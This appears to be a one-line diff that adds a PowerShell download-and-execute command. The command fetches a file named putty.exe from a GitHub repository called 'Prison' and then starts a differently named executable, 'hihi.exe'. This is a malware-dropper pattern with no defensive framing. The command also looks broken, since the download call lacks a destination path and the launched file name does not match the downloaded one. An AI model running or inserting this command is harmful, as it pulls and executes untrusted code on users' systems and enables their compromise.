@@ -1,0 +1,1 @@
+powershell  (New-Object System.Net.WebClient).DownloadFile('https://github.com/pro4m/Prison/blob/master/sample/putty.exe');Start-Process 'hihi.exe';exit;
